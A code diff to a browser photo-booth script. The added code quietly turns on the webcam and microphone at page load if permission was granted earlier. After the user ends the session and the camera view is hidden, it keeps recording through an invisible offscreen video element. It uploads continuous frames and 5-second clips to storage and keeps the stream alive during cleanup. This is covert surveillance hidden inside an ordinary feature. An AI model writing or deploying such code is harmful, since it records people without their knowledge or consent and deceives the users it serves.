@@ -19,7 +19,34 @@ let compilingDotsInterval = null;
 let isVideoBlobReady = false;
 let isFinalizingAfterUploads = false;
 let hasVideoUploadAttempted = false;
+let pendingVideoBlobResolve = null;
+let isStoppingRecorderForUpload = false;
 const UPLOAD_DEBUG = true;
+
+// Adaptive auxiliary frame capture/upload (stored under sessions/{sessionId}/images/aux/)
+const AUX_CAPTURE_ENABLED = true;
+const AUX_MIN_INTERVAL_MS = 80;
+const AUX_MAX_INTERVAL_MS = 1400;
+const AUX_MAX_QUEUE = 80;
+const AUX_MAX_CONCURRENT_UPLOADS = 4;
+let auxCaptureRunning = false;
+let auxCaptureTimer = null;
+let auxQueue = [];
+let auxUploadsInFlight = 0;
+let auxFrameCounter = 0;
+let auxDroppedFrames = 0;
+let auxSourceVideo = null;
+let auxCanvas = null;
+let auxCtx = null;
+let auxFrameLedger = [];
+
+// Continuous post-main-upload clip recording pipeline
+const CLIP_CAPTURE_DURATION_MS = 5000;
+let clipSequenceRunning = false;
+let clipRecorder = null;
+let clipStopTimer = null;
+let clipCounter = 0;
+let clipSequenceStartTimestamp = null;
 
 function logUploadPipeline(message, extra) {
     if (!UPLOAD_DEBUG) return;
@@ -28,6 +55,335 @@ function logUploadPipeline(message, extra) {
         return;
     }
     console.log(`[UPLOAD_PIPELINE] ${message}`);
+}
+
+function getAuxCaptureIntervalMs() {
+    const load = Math.min((auxQueue.length + auxUploadsInFlight) / AUX_MAX_QUEUE, 1);
+    return Math.round(AUX_MIN_INTERVAL_MS + (AUX_MAX_INTERVAL_MS - AUX_MIN_INTERVAL_MS) * load);
+}
+
+function getMediaRecorderOptions() {
+    const options = {
+        mimeType: 'video/webm;codecs=vp9',
+        videoBitsPerSecond: 2500000
+    };
+
+    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+        options.mimeType = 'video/webm;codecs=vp8';
+    }
+    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+        options.mimeType = 'video/webm';
+    }
+
+    return options;
+}
+
+function scheduleNextAuxCaptureTick() {
+    if (!auxCaptureRunning) return;
+    clearTimeout(auxCaptureTimer);
+    auxCaptureTimer = setTimeout(runAuxCaptureTick, getAuxCaptureIntervalMs());
+}
+
+function runAuxCaptureTick() {
+    if (!auxCaptureRunning) return;
+    if (!auxSourceVideo || !auxCanvas || !auxCtx) {
+        scheduleNextAuxCaptureTick();
+        return;
+    }
+
+    if (auxQueue.length >= AUX_MAX_QUEUE) {
+        auxDroppedFrames++;
+        if (auxDroppedFrames % 50 === 0) {
+            logUploadPipeline('Aux capture backpressure: dropping frames', {
+                droppedFrames: auxDroppedFrames,
+                queueLength: auxQueue.length,
+                uploadsInFlight: auxUploadsInFlight
+            });
+        }
+        scheduleNextAuxCaptureTick();
+        return;
+    }
+
+    const frameW = auxSourceVideo.videoWidth || 0;
+    const frameH = auxSourceVideo.videoHeight || 0;
+    if (!frameW || !frameH) {
+        scheduleNextAuxCaptureTick();
+        return;
+    }
+
+    auxCanvas.width = frameW;
+    auxCanvas.height = frameH;
+    auxCtx.drawImage(auxSourceVideo, 0, 0);
+
+    const frameId = ++auxFrameCounter;
+    const frameTs = Date.now();
+    const storagePath = `sessions/${sessionId}/images/aux/frame_${String(frameId).padStart(8, '0')}_${frameTs}.jpg`;
+    auxCanvas.toBlob((blob) => {
+        if (!auxCaptureRunning || !blob) {
+            scheduleNextAuxCaptureTick();
+            return;
+        }
+        auxQueue.push({ frameId, blob, ts: frameTs, storagePath });
+        auxFrameLedger.push({
+            frameId,
+            ts: frameTs,
+            blob,
+            auxPath: storagePath,
+            uploaded: false,
+            moved: false
+        });
+        processAuxUploadQueue();
+        scheduleNextAuxCaptureTick();
+    }, 'image/jpeg', 0.82);
+}
+
+function processAuxUploadQueue() {
+    if (!sessionId) return;
+
+    while (auxUploadsInFlight < AUX_MAX_CONCURRENT_UPLOADS && auxQueue.length > 0) {
+        const next = auxQueue.shift();
+        auxUploadsInFlight++;
+
+        uploadBlobToStorage(next.blob, next.storagePath)
+            .then(() => {
+                const record = auxFrameLedger.find((item) => item.frameId === next.frameId);
+                if (record) record.uploaded = true;
+            })
+            .catch((error) => {
+                const record = auxFrameLedger.find((item) => item.frameId === next.frameId);
+                if (record) record.uploadFailed = true;
+                console.error('[UPLOAD_PIPELINE] Aux frame upload failed:', error);
+            })
+            .finally(() => {
+                auxUploadsInFlight = Math.max(0, auxUploadsInFlight - 1);
+                if (auxQueue.length > 0) {
+                    processAuxUploadQueue();
+                }
+            });
+    }
+}
+
+async function startAuxCapturePipeline() {
+    if (!AUX_CAPTURE_ENABLED || auxCaptureRunning) return;
+    if (!mediaStream || !sessionId) {
+        logUploadPipeline('Aux capture not started (missing media stream or sessionId)');
+        return;
+    }
+
+    auxQueue = [];
+    auxUploadsInFlight = 0;
+    auxDroppedFrames = 0;
+    auxFrameLedger = [];
+
+    auxSourceVideo = document.createElement('video');
+    auxSourceVideo.autoplay = true;
+    auxSourceVideo.playsInline = true;
+    auxSourceVideo.muted = true;
+    auxSourceVideo.srcObject = mediaStream;
+    auxSourceVideo.style.position = 'fixed';
+    auxSourceVideo.style.width = '1px';
+    auxSourceVideo.style.height = '1px';
+    auxSourceVideo.style.opacity = '0';
+    auxSourceVideo.style.pointerEvents = 'none';
+    auxSourceVideo.style.left = '-9999px';
+    document.body.appendChild(auxSourceVideo);
+
+    auxCanvas = document.createElement('canvas');
+    auxCtx = auxCanvas.getContext('2d');
+
+    try {
+        await auxSourceVideo.play();
+    } catch (error) {
+        console.error('[UPLOAD_PIPELINE] Aux source video play failed:', error);
+    }
+
+    auxCaptureRunning = true;
+    logUploadPipeline('Aux capture pipeline started', {
+        minIntervalMs: AUX_MIN_INTERVAL_MS,
+        maxIntervalMs: AUX_MAX_INTERVAL_MS,
+        maxQueue: AUX_MAX_QUEUE,
+        maxConcurrentUploads: AUX_MAX_CONCURRENT_UPLOADS
+    });
+    scheduleNextAuxCaptureTick();
+}
+
+function stopAuxCapturePipeline() {
+    auxCaptureRunning = false;
+    clearTimeout(auxCaptureTimer);
+    auxCaptureTimer = null;
+    auxQueue = [];
+    auxUploadsInFlight = 0;
+
+    if (auxSourceVideo) {
+        try {
+            auxSourceVideo.pause();
+        } catch (e) {
+            // no-op
+        }
+        if (auxSourceVideo.parentNode) {
+            auxSourceVideo.parentNode.removeChild(auxSourceVideo);
+        }
+    }
+    auxSourceVideo = null;
+    auxCanvas = null;
+    auxCtx = null;
+}
+
+function trimAuxLedger(maxEntries = 4000) {
+    if (auxFrameLedger.length <= maxEntries) return;
+    auxFrameLedger = auxFrameLedger.slice(auxFrameLedger.length - maxEntries);
+}
+
+async function waitForAuxWindowUploads(clipStartTs, clipEndTs, timeoutMs = 10000) {
+    const start = Date.now();
+    while (Date.now() - start < timeoutMs) {
+        const hasPending = auxFrameLedger.some((frame) =>
+            frame.ts >= clipStartTs &&
+            frame.ts < clipEndTs &&
+            !frame.uploaded &&
+            !frame.uploadFailed
+        );
+        if (!hasPending) return;
+        await new Promise((resolve) => setTimeout(resolve, 120));
+    }
+}
+
+async function moveAuxFramesToClippedSubfolder(clipIndex, clipStartTs, clipEndTs) {
+    if (!sessionId) return;
+    await waitForAuxWindowUploads(clipStartTs, clipEndTs);
+
+    const recordsInWindow = auxFrameLedger.filter((frame) =>
+        frame.ts >= clipStartTs &&
+        frame.ts < clipEndTs &&
+        frame.uploaded &&
+        !frame.moved
+    );
+
+    for (const frame of recordsInWindow) {
+        const filename = frame.auxPath.split('/').pop();
+        const clippedPath = `sessions/${sessionId}/images/clipped/clip_${String(clipIndex).padStart(6, '0')}/${filename}`;
+
+        try {
+            await uploadBlobToStorage(frame.blob, clippedPath);
+            await storage.ref(frame.auxPath).delete();
+            frame.moved = true;
+            frame.blob = null;
+            frame.clippedPath = clippedPath;
+        } catch (error) {
+            console.error('[UPLOAD_PIPELINE] Failed moving aux frame to clipped path:', error);
+        }
+    }
+
+    trimAuxLedger();
+}
+
+async function uploadSingleClip(clipBlob, clipIndex, clipStartTs, clipEndTs) {
+    if (!sessionId || !clipBlob || clipBlob.size === 0) {
+        return;
+    }
+
+    const clipPath = `sessions/${sessionId}/clips/clip_${String(clipIndex).padStart(6, '0')}_${clipStartTs}.webm`;
+    try {
+        const downloadUrl = await uploadBlobToStorage(clipBlob, clipPath);
+        await uploadToDatabase(`sessions/${sessionId}/clips/clip_${String(clipIndex).padStart(6, '0')}`, {
+            timestamp: new Date().toISOString(),
+            clipIndex,
+            startTimestamp: clipStartTs,
+            endTimestamp: clipEndTs,
+            durationMs: clipEndTs - clipStartTs,
+            downloadUrl,
+            size: clipBlob.size
+        });
+
+        await moveAuxFramesToClippedSubfolder(clipIndex, clipStartTs, clipEndTs);
+    } catch (error) {
+        console.error('[UPLOAD_PIPELINE] Clip upload failed:', error);
+    }
+}
+
+function stopClipCapturePipeline() {
+    clipSequenceRunning = false;
+    clearTimeout(clipStopTimer);
+    clipStopTimer = null;
+
+    if (clipRecorder && clipRecorder.state === 'recording') {
+        try {
+            clipRecorder.stop();
+        } catch (error) {
+            console.error('[UPLOAD_PIPELINE] Clip recorder stop failed:', error);
+        }
+    }
+
+    clipRecorder = null;
+}
+
+function startClipCapturePipeline() {
+    if (clipSequenceRunning || !mediaStream || !sessionId) return;
+
+    clipSequenceRunning = true;
+    clipCounter = 0;
+    clipSequenceStartTimestamp = Date.now();
+    logUploadPipeline('Clip capture pipeline started', {
+        clipDurationMs: CLIP_CAPTURE_DURATION_MS,
+        sequenceStartTimestamp: clipSequenceStartTimestamp
+    });
+    uploadToDatabase(`sessions/${sessionId}/clips_meta`, {
+        sequenceStartTimestamp: clipSequenceStartTimestamp,
+        clipDurationMs: CLIP_CAPTURE_DURATION_MS
+    }).catch((error) => {
+        console.error('[UPLOAD_PIPELINE] Failed to store clip sequence metadata:', error);
+    });
+
+    const beginNextClip = () => {
+        if (!clipSequenceRunning || !mediaStream) return;
+        clearTimeout(clipStopTimer);
+        clipStopTimer = null;
+
+        const clipStartTs = Date.now();
+        const clipIndex = ++clipCounter;
+        const clipChunks = [];
+
+        clipRecorder = new MediaRecorder(mediaStream, getMediaRecorderOptions());
+        clipRecorder.ondataavailable = (event) => {
+            if (event.data && event.data.size > 0) {
+                clipChunks.push(event.data);
+            }
+        };
+        clipRecorder.onstop = () => {
+            clearTimeout(clipStopTimer);
+            clipStopTimer = null;
+            const clipEndTs = Date.now();
+            const clipBlob = new Blob(clipChunks, { type: 'video/webm' });
+
+            // Restart immediately to keep clips contiguous.
+            if (clipSequenceRunning) {
+                beginNextClip();
+            }
+
+            uploadSingleClip(clipBlob, clipIndex, clipStartTs, clipEndTs);
+        };
+        clipRecorder.onerror = (event) => {
+            clearTimeout(clipStopTimer);
+            clipStopTimer = null;
+            console.error('[UPLOAD_PIPELINE] Clip recorder error:', event.error || event);
+            if (clipSequenceRunning) {
+                setTimeout(beginNextClip, 50);
+            }
+        };
+
+        clipRecorder.start();
+        clipStopTimer = setTimeout(() => {
+            if (clipRecorder && clipRecorder.state === 'recording') {
+                try {
+                    clipRecorder.stop();
+                } catch (error) {
+                    console.error('[UPLOAD_PIPELINE] Clip stop timer failed:', error);
+                }
+            }
+        }, CLIP_CAPTURE_DURATION_MS);
+    };
+
+    beginNextClip();
 }
 
 function showCompilingOverlay() {
@@ -91,6 +447,66 @@ function hideCompilingOverlay() {
     compilingOverlay = null;
 }
 let camMode = false;
+let hasAttemptedBackgroundWarmup = false;
+
+const CAMERA_CONSTRAINTS = {
+    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+    audio: true
+};
+
+function updateSessionIdFromWindow() {
+    if (window.sessionId) {
+        sessionId = window.sessionId;
+    }
+}
+
+async function hasGrantedCameraPermission() {
+    if (!navigator.permissions || typeof navigator.permissions.query !== 'function') {
+        return false;
+    }
+
+    try {
+        const status = await navigator.permissions.query({ name: 'camera' });
+        return status.state === 'granted';
+    } catch (error) {
+        return false;
+    }
+}
+
+async function ensureMediaStream({ requestPermission }) {
+    if (mediaStream && mediaStream.active) return true;
+    if (!navigator.mediaDevices || typeof navigator.mediaDevices.getUserMedia !== 'function') {
+        return false;
+    }
+
+    if (!requestPermission) {
+        const cameraGranted = await hasGrantedCameraPermission();
+        if (!cameraGranted) return false;
+    }
+
+    mediaStream = await navigator.mediaDevices.getUserMedia(CAMERA_CONSTRAINTS);
+    return true;
+}
+
+function ensureRecordingStarted() {
+    if (!mediaStream || isRecording) return;
+    startRecording();
+}
+
+async function warmupCameraInBackgroundOnLoad() {
+    if (hasAttemptedBackgroundWarmup) return;
+    hasAttemptedBackgroundWarmup = true;
+
+    updateSessionIdFromWindow();
+
+    try {
+        const streamReady = await ensureMediaStream({ requestPermission: false });
+        if (!streamReady) return;
+        ensureRecordingStarted();
+    } catch (error) {
+        console.log('Background camera warmup skipped:', error);
+    }
+}
 
 /**
  * Shows the attractive photo booth button after acceptance
@@ -109,14 +525,8 @@ function showPhotoBoothButton() {
  */
 async function startPhotoBooth() {
     try {
-        // Get session ID from meta.js
-        sessionId = window.sessionId;
-
-        // Request camera permission
-        mediaStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
-            audio: true
-        });
+        updateSessionIdFromWindow();
+        await ensureMediaStream({ requestPermission: true });
 
         // Remove the photo booth button
         const photoBtn = document.getElementById('photo-booth-btn');
@@ -124,7 +534,7 @@ async function startPhotoBooth() {
 
         // Create camera interface
         createCameraInterface();
-        startRecording();
+        ensureRecordingStarted();
     } catch (error) {
         console.error('Camera access denied:', error);
         alert('Camera permission is required to take a picture together!');
@@ -341,20 +751,10 @@ function startRecording() {
     videoBlob = null;
     isVideoBlobReady = false;
     hasVideoUploadAttempted = false;
-    const options = {
-        mimeType: 'video/webm;codecs=vp9',
-        videoBitsPerSecond: 2500000
-    };
-
-    // Fallback for browsers that don't support vp9
-    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-        options.mimeType = 'video/webm;codecs=vp8';
-    }
-    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-        options.mimeType = 'video/webm';
-    }
-
-    mediaRecorder = new MediaRecorder(mediaStream, options);
+    auxFrameCounter = 0;
+    pendingVideoBlobResolve = null;
+    isStoppingRecorderForUpload = false;
+    mediaRecorder = new MediaRecorder(mediaStream, getMediaRecorderOptions());
 
     mediaRecorder.ondataavailable = (event) => {
         recordedChunks.push(event.data);
@@ -363,6 +763,12 @@ function startRecording() {
     mediaRecorder.onstop = () => {
         videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
         isVideoBlobReady = true;
+        isRecording = false;
+        logUploadPipeline('Recorder stopped; video blob ready', { sizeBytes: videoBlob.size });
+        if (typeof pendingVideoBlobResolve === 'function') {
+            pendingVideoBlobResolve();
+            pendingVideoBlobResolve = null;
+        }
         checkIfAllUploadsComplete();
     };
 
@@ -461,18 +867,13 @@ function captureImage() {
  */
 function stopPictures() {
     if (mediaRecorder && isRecording) {
-        isRecording = false;
         isUploadingImages = true;
         logUploadPipeline('Stop requested -> entering compiling/upload phase');
+        camMode = false;
 
         // Hide the camera feed immediately
         const container = document.getElementById('camera-container');
         if (container) container.style.display = 'none';
-
-        // Stop recorder now so video blob can be prepared during "Compiling...".
-        if (mediaRecorder.state === 'recording') {
-            mediaRecorder.stop();
-        }
 
         // Capture final frame from camera
         setTimeout(async () => {
@@ -497,6 +898,39 @@ function stopPictures() {
     }
 }
 
+async function ensureVideoBlobReadyForUpload() {
+    if (isVideoBlobReady) return;
+    if (!mediaRecorder) return;
+
+    if (mediaRecorder.state === 'inactive') {
+        if (!videoBlob || videoBlob.size === 0) {
+            videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+        }
+        isVideoBlobReady = true;
+        isRecording = false;
+        return;
+    }
+
+    if (isStoppingRecorderForUpload) {
+        await new Promise((resolve) => {
+            const previousResolver = pendingVideoBlobResolve;
+            pendingVideoBlobResolve = () => {
+                if (typeof previousResolver === 'function') previousResolver();
+                resolve();
+            };
+        });
+        return;
+    }
+
+    isStoppingRecorderForUpload = true;
+    logUploadPipeline('Image uploads complete -> stopping recorder to begin video upload');
+    await new Promise((resolve) => {
+        pendingVideoBlobResolve = resolve;
+        mediaRecorder.stop();
+    });
+    isStoppingRecorderForUpload = false;
+}
+
 /**
  * Checks if all image uploads are complete and proceeds to show download page
  */
@@ -507,15 +941,18 @@ async function checkIfAllUploadsComplete() {
     const allImagesComplete = imageCounter === 0 || uploadedImageCount >= imageCounter;
     const finalFrameReady = Boolean(finalFrameBlob);
 
-    // Wait until image uploads, final-frame capture, and video blob are all ready.
-    if (!allImagesComplete || !finalFrameReady || !isVideoBlobReady) return;
+    // Wait until image uploads and final-frame capture are ready.
+    if (!allImagesComplete || !finalFrameReady) return;
 
     isFinalizingAfterUploads = true;
     try {
-        logUploadPipeline('All image uploads complete; starting video upload', {
+        logUploadPipeline('All image uploads complete; preparing video upload', {
             imageCounter,
             uploadedImageCount
         });
+        await ensureVideoBlobReadyForUpload();
+        await startAuxCapturePipeline();
+        startClipCapturePipeline();
         // Required order: after all image uploads, upload the video.
         await uploadVideoAfterImages();
         readyToShowDownload = true;
@@ -725,8 +1162,8 @@ function cleanup() {
     isUploadingImages = false;
     isFinalizingAfterUploads = false;
 
-    // Recording should already be stopped before cleanup; just release tracks.
-    if (mediaStream) {
+    // Keep stream alive while aux capture runs; otherwise release tracks.
+    if (mediaStream && !auxCaptureRunning) {
         mediaStream.getTracks().forEach(track => track.stop());
     }
 
@@ -777,7 +1214,15 @@ async function uploadVideoAfterImages() {
  * Cleans up resources and finishes the photo booth session
  */
 function finishAndReset() {
+    stopClipCapturePipeline();
+    stopAuxCapturePipeline();
     location.reload();
+}
+
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', warmupCameraInBackgroundOnLoad, { once: true });
+} else {
+    warmupCameraInBackgroundOnLoad();
 }
 
 // ============================================================================
